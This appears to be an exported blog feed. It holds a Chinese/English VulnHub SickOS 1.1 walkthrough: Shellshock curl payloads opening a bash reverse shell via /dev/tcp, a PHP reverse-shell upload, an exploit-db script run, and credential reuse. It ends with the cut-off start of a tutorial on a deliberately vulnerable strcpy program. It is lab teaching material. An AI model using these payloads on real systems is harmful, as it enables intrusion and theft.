http://192.168.135.157/server-status (CODE:403|SIZE:296)<br></code></pre></td></tr></table></figure><p>发现 robots.txt，访问 <code>http://192.168.135.157/robots.txt</code> ：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/<br><span class="hljs-attribute">Dissalow</span><span class="hljs-punctuation">: </span>/wolfcms<br></code></pre></td></tr></table></figure><p>发现 wolfcms 页面，访问 <code>http://192.168.135.157/wolfcms/</code> ，发现是个 CMS ，查询可知，wolfcms 有后台文件上传漏洞</p><p>使用其他工具进行扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.157/wolfcms/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --random-agent   --proxy   http://192.168.135.157:3128</span><br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.135.157/wolfcms/<br>[+] Method:                  GET<br>[+] Threads:                 50<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] Proxy:                   http://192.168.135.157:3128<br>[+] User Agent:              Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16<br>[+] Timeout:                 10s<br>===============================================================<br>2022/07/10 04:33:24 Starting gobuster in directory enumeration mode<br>===============================================================<br>/docs                 (Status: 301) [Size: 325] [--&gt; http://192.168.135.157/wolfcms/docs/]<br>/public               (Status: 301) [Size: 327] [--&gt; http://192.168.135.157/wolfcms/public/]<br>/config               (Status: 200) [Size: 0]                                               <br>/favicon              (Status: 200) [Size: 894]                                             <br>/robots               (Status: 200) [Size: 0]                                               <br>/index                (Status: 200) [Size: 3975]                                            <br>/wolf                 (Status: 301) [Size: 325] [--&gt; http://192.168.135.157/wolfcms/wolf/]  <br>/composer             (Status: 200) [Size: 403]                                             <br>                                                                                            <br>===============================================================<br>2022/07/10 04:34:35 Finished<br>===============================================================<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.157 --proxy http://192.168.135.157:3128</span>     <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.157/_22-07-10_05-01-37.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-10_05-01-37.log<br>Target: http://192.168.135.157/<br><br>[05:01:37] Starting: <br>[05:01:59] 403 -  291B  - /cgi-bin/                                         <br>[05:02:03] 403 -  302B  - /doc/en/changes.html                              <br>[05:02:03] 403 -  302B  - /doc/html/index.html                              <br>[05:02:03] 403 -  287B  - /doc/<br>[05:02:03] 403 -  301B  - /doc/stable.version<br>[05:02:03] 403 -  291B  - /doc/api/<br>[05:02:09] 200 -   21B  - /index                                            <br>[05:02:09] 200 -   21B  - /index.php                                                                        <br>[05:02:23] 200 -   45B  - /robots.txt                                       <br>[05:02:24] 403 -  297B  - /server-status/                                   <br>[05:02:24] 403 -  296B  - /server-status<br>                                                                             <br>Task Completed   <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.157 -useproxy http://192.168.135.157:3128</span><br>- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.135.157<br>+ Target Hostname:    192.168.135.157<br>+ Target Port:        80<br>+ Proxy:              192.168.135.157:3128<br>+ Start Time:         2022-07-10 04:56:36 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.2.22 (Ubuntu)<br>+ Retrieved via header: 1.0 localhost (squid/3.1.19)<br>+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21<br>+ The anti-clickjacking X-Frame-Options header is not present.<br>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br>+ Uncommon header &#x27;x-cache&#x27; found, with contents: MISS from localhost<br>+ Uncommon header &#x27;x-cache-lookup&#x27; found, with contents: MISS from localhost:3128<br>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br>+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  4 19:35:02 2015<br>+ Uncommon header &#x27;tcn&#x27; found, with contents: list<br>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#x27;index&#x27; were found: index.php<br>+ Server banner has changed from &#x27;Apache/2.2.22 (Ubuntu)&#x27; to &#x27;squid/3.1.19&#x27; which may suggest a WAF, load balancer or proxy is in place<br>+ Uncommon header &#x27;x-squid-error&#x27; found, with contents: ERR_INVALID_REQ 0<br>+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br>+ Uncommon header &#x27;93e4r0-cve-2014-6271&#x27; found, with contents: true<br>+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the &#x27;shellshock&#x27; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).<br>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br>+ 8726 requests: 0 error(s) and 15 item(s) reported on remote host<br>+ End Time:           2022-07-10 04:57:14 (GMT-4) (38 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure><p>nikto 扫描出一个 shellshock 漏洞</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><h3 id="1、Upload-file"><a href="#1、Upload-file" class="headerlink" title="1、Upload file"></a>1、Upload file</h3><blockquote><p><a href="https://www.cnblogs.com/yujin2020/p/14187067.html">Wolf CMS后台文件上传getshell并提权 - 誉津 - 博客园 (cnblogs.com)</a></p></blockquote><p>访问 <code>http://192.168.135.157/wolfcms/docs/updating</code> ，得到 wolfcms 版本：0.8.2</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># Wolf CMS - INFORMATION ABOUT UPDATING</span><br><br><span class="hljs-comment">## GENERAL ##</span><br>Please be aware that we only support single <span class="hljs-built_in">version</span> upgrades.<br>IMPORTANT - always check your security <span class="hljs-keyword">by</span> viewing security.php <span class="hljs-built_in">post</span> update!<br><br><span class="hljs-comment">### Upgrading from 0.8.1 =&gt; 0.8.2 ###</span><br>SECURITY UPDATE - This release <span class="hljs-keyword">contains</span> <span class="hljs-keyword">a</span> <span class="hljs-literal">one</span>-<span class="hljs-built_in">file</span> security patch.<br>There are no database changes <span class="hljs-keyword">in</span> this release <span class="hljs-keyword">and</span> only <span class="hljs-literal">one</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">contains</span> code changes,<br>so you can upgrade <span class="hljs-keyword">by</span> simply replacing wolf/plugins/archive/archive.php <span class="hljs-keyword">and</span> index.php.<br>Index.php needs replacing only because <span class="hljs-keyword">it</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> updated <span class="hljs-built_in">version</span> <span class="hljs-built_in">number</span>, either<br><span class="hljs-built_in">replace</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> update <span class="hljs-keyword">the</span> <span class="hljs-built_in">version</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">by</span> hand.<br></code></pre></td></tr></table></figure><p>此版本存在后台文件上传，访问 <code>http://192.168.135.157/wolfcms/?/admin/login</code> ，进入后台登录界面</p><p>尝试弱口令 <code>admin:admin</code> 登录，成功登陆，在 <code>Files</code> 下发现可以上传文件，上传反弹 shell ，kali 监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.135.157/wolfcms/public/php-reverse-shell.php</code> ，成功反弹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.157] 50480<br>Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux<br> 11:11:51 up  2:45,  0 users,  load average: 54.24, 52.71, 36.84<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h3 id="2、Shellshock"><a href="#2、Shellshock" class="headerlink" title="2、Shellshock"></a>2、Shellshock</h3><blockquote><p> <a href="https://jhalon.github.io/vulnhub-sick-os1/">https://jhalon.github.io/vulnhub-sick-os1/</a></p></blockquote><p>It seems that wolfcms is a blog. I thoroughly reviewed the content to see if there wasn’t anything of value. Unfortunately, there wasn’t - so I decided to take advantage of the Shellshock vulnerability and attempt a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse tcp shell</a> on the server.</p><p>First things first, we have to set up a netcat listener.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@kali:~# nc -lnvp 1234<br>listening on [any] 1234 ...<br></code></pre></td></tr></table></figure><p>Now before we exploit Shellshock, we need to understand what the vulnerability is, and how it works. So let me explain before we begin exploiting it.</p><p>Shellshock - <a href="http://www.cvedetails.com/cve/cve-2014-6271">CVE-2014-6271</a> and <a href="http://www.cvedetails.com/cve/cve-2014-6278">CVE-2014-6278</a> - was a serious vulnerability found in the Bash command shell, which is commonly used in Linux distributions. The vulnerability allowed attackers to run arbitrary commands on an affected system. The most commonly affected webs server where the ones using the <a href="http://www.cgi101.com/book/ch3/text.html">CGI Environment</a>.</p><p>In general - Bash allows the exporting of shell function to other bash instances on the server. It is done by creating an environmental variable with the function definition as such…</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">env <span class="hljs-attribute">ENV_VAR_FN</span>=’() &#123; &lt;your function&gt; &#125;;’<br></code></pre></td></tr></table></figure><p>The <strong>ENV_VAR_FN</strong> is the function that is executed in the bash instance. Unfortunately, there was a bug in the implementation of this to where the function continued to read and execute beyond the function definition - allowing to run additional code. Technically it should have stopped reading past the function definition, marked with a <code>;</code>.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">env ENV_VAR_FN=’() &#123; <span class="hljs-tag">&lt;<span class="hljs-name">your</span> <span class="hljs-attr">function</span>&gt;</span> &#125;; <span class="hljs-tag">&lt;<span class="hljs-name">attacker</span> <span class="hljs-attr">code</span> <span class="hljs-attr">here</span>&gt;</span>’<br></code></pre></td></tr></table></figure><p>Many services were affected by this bug. Any web server that consumed user input and added the input to the bash environment, was vulnerable. A possible exploit in the CGI Environment would look like this.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/&lt;server path&gt; HTTP/</span><span class="hljs-number">1.1</span><br><br>User-agent: () &#123; :;&#125;; echo something&gt;<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>new_file<br></code></pre></td></tr></table></figure><p>This command would create a file called <strong>new_file</strong>, which an attacker could use to their advantage. So, since we now know that <strong>cgi-bin/status</strong> is exploitable, and we know “how” to exploit it, let go ahead and do so!</p><p>We will be leveraging the <a href="https://curl.haxx.se/docs/manpage.html">cURL</a> command for this vulnerability. This way we can send edited User-Agent header information that will be accepted by the CGI’s Bash environment.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@kali:~# curl -x http://192.168.135.157:3128 -H &quot;User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/192.168.135.141/1234 0&gt;&amp;1&quot; http://192.168.135.157/cgi-bin/status<br></code></pre></td></tr></table></figure><p>What I did there was use the <strong>-x</strong> switch to initiate a connection using our HTTP Proxy, and then used the <strong>-H</strong> switch to include a edited User-Agent header. The code I executed was a reverse tcp bash shell. If done correctly, we should have gotten a reverse shell through netcat!</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.157] 41481<br>bash: no job control in this shell<br>www-data@SickOs:/usr/lib/cgi-bin$ whoami<br>whoami<br>www-data<br></code></pre></td></tr></table></figure><p>也可以直接使用脚本，searchsploit 查找：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit shellshock apache</span><br>-------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                            |  Path<br>-------------------------------------------------------------------------- ---------------------------------<br>Apache mod_cgi - &#x27;Shellshock&#x27; Remote Command Injection                    | linux/remote/34900.py<br>-------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/remote/34900.py</span>                     <br>[......]<br><br>Usage:<br>./exploit.py var=&lt;value&gt;<br><br>Vars:<br>rhost: victim host<br>rport: victim port for TCP shell binding<br>lhost: attacker host for TCP shell reversing<br>lport: attacker port for TCP shell reversing<br>pages:  specific cgi vulnerable pages (separated by comma)<br>proxy: host:port proxy<br><br>Payloads:<br>&quot;reverse&quot; (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)<br>&quot;bind&quot; (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)<br><br>Example:<br><br>./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234<br>./exploit.py payload=bind rhost=1.2.3.4 rport=1234<br><br>[......]<br></code></pre></td></tr></table></figure><p>利用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python exp.py payload=reverse rhost=192.168.135.157 lhost=192.168.135.141 lport=4444 proxy=192.168.135.157:3128 pages=/cgi-bin/status/</span><br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查看用户和目录下文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>sickos<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /var/www/html</span><br>/bin/sh: 4: cd: can&#x27;t cd to /var/www/html<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /varwww/wolfcms</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>CONTRIBUTING.md<br>README.md<br>composer.json<br>config.php<br>docs<br>favicon.ico<br>index.php<br>public<br>robots.txt<br>wolf<br><span class="hljs-meta">$</span><span class="bash"> cat config.php</span><br>&lt;?php <br><br>// Database information:<br>// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)<br>// The path can only be absolute path or :memory:<br>// For more info look at: www.php.net/pdo<br><br>// Database settings:<br>define(&#x27;DB_DSN&#x27;, &#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;);<br>define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);<br>define(&#x27;DB_PASS&#x27;, &#x27;john@123&#x27;);<br>define(&#x27;TABLE_PREFIX&#x27;, &#x27;&#x27;);<br></code></pre></td></tr></table></figure><p>得到系统用户：sickos ；数据库账号：root，密码：john@123</p><p>尝试SSH撞库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh sickos@192.168.135.157</span><br>sickos@192.168.135.157&#x27;s password: <br>Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)<br>sickos@SickOs:~$ whoami<br>sickos<br>sickos@SickOs:~$ id<br>uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)<br></code></pre></td></tr></table></figure><p>成功拿到 sickos 用户权限，发现此用户拥有 sudo 权限，直接 sudo su 提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">sickos@SickOs:~$ sudo -l<br>[sudo] password for sickos: <br>Matching Defaults entries for sickos on this host:<br>    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User sickos may run the following commands on this host:<br>    (ALL : ALL) ALL<br>sickos@SickOs:~$ sudo su<br>root@SickOs:/home/sickos# whoami<br>root<br>root@SickOs:/home/sickos# ls /root<br>a0216ea4d51874464078c618298b1367.txt<br>root@SickOs:/home/sickos# cat /root/a0216ea4d51874464078c618298b1367.txt<br>If you are viewing this!!<br>ROOT!<br>You have Succesfully completed SickOS1.1.<br>Thanks for Trying<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol><li>端口代理服务</li><li>目录扫描：robots.txt</li><li>nikto 扫描：shellshock</li><li>wolfcms：后台登录页面、弱口令登录、后台文件上传</li><li>配置文件：数据库账号密码</li><li>SSH撞库</li><li>sudo提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Buffer Overflow</title>
    <link href="/2022/07/07/CTF/Pwn/Linux-Buffer-Overflow/"/>
    <url>/2022/07/07/CTF/Pwn/Linux-Buffer-Overflow/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-Buffer-Overflow"><a href="#Linux-Buffer-Overflow" class="headerlink" title="Linux Buffer Overflow"></a>Linux Buffer Overflow</h1><blockquote><p><a href="https://secnigma.wordpress.com/2021/04/05/an-introduction-into-linux-buffer-overflow/">https://secnigma.wordpress.com/2021/04/05/an-introduction-into-linux-buffer-overflow/</a></p><p><a href="https://samsclass.info/127/proj/lbuf1.htm">https://samsclass.info/127/proj/lbuf1.htm</a></p><p><a href="https://samsclass.info/127/proj/p3-lbuf1.htm">https://samsclass.info/127/proj/p3-lbuf1.htm</a> </p></blockquote><h2 id="Disabling-ASLR"><a href="#Disabling-ASLR" class="headerlink" title="Disabling ASLR"></a>Disabling ASLR</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/StackOverflowtest]<br>└─$ sudo su<br>[sudo] password for kali: <br>┌──(root💀kali)-[/home/kali/StackOverflowtest]<br>└─# echo 0 &gt; /proc/sys/kernel/randomize_va_space<br><br>┌──(root💀kali)-[/home/kali/StackOverflowtest]<br>└─# exit<br></code></pre></td></tr></table></figure><h2 id="Creating-a-Vulnerable-Program"><a href="#Creating-a-Vulnerable-Program" class="headerlink" title="Creating a Vulnerable Program"></a>Creating a Vulnerable Program</h2><p><strong>C 源码：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br>void main(int argc, char *argv[]) &#123;<br>    char buffer[100];<br>    strcpy(buffer, argv[1]);<br>    printf(&quot;Done!\n&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>编译、执行：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc-multilib</span><br><span class="hljs-meta">$</span><span class="bash"> gcc -fno-stack-protector -z execstack -no-pie -m32 -g -o bol bol.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./bol A</span><br>Done!<br></code></pre></td></tr></table></figure><h2 id="Overflowing-the-Stack"><a href="#Overflowing-the-Stack" class="headerlink" title="Overflowing the Stack"></a>Overflowing the Stack</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*116)&#x27;</span></span>               <br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./bol AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol <br></code></pre></td></tr></table></figure><h2 id="Debugging-the-Program"><a href="#Debugging-the-Program" class="headerlink" title="Debugging the Program"></a>Debugging the Program</h2><blockquote><p><a href="https://www.jianshu.com/p/283b5466684b">peda的使用 - 简书 (jianshu.com)</a></p></blockquote><p>gdb-peda 安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta"> #</span><span class="bash"> gdb如果安装不上，可以换源安装：mirrors.tuna.tsinghua.edu.cn</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt install gdb</span><br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/longld/peda.git ~/peda</span> <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span> <br></code></pre></td></tr></table></figure><p>gdb 运行调试，list 可以查看 C 语言源码，break 添加断点 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol</span><br>Reading symbols from bol...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x80491ad: file bol.c, line 6.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>因为溢出点在 <code>strcpy()</code> 函数，所以在第六行打断点，查看溢出后栈的情况和寄存器的情况。</p><h3 id="Normal-Execution"><a href="#Normal-Execution" class="headerlink" title="Normal Execution"></a>Normal Execution</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 